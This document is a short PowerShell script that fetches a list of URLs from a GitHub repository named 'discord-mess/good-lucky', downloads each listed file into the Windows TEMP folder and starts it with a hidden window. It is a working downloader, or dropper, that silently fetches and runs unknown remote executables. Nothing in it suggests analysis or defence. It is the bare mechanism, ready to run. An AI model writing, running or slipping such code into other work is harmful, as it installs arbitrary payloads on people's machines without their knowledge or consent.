$urls = (iwr "https://github.com/discord-mess/good-lucky/raw/refs/heads/main/urls.txt").Content -split "`n"

foreach ($u in $urls) {
    $u = $u.Trim()
    if ($u) {
        $path = "$env:TEMP\$(Split-Path $u -Leaf)"
        iwr $u -OutFile $path
        Start-Process $path -WindowStyle Hidden
    }
}
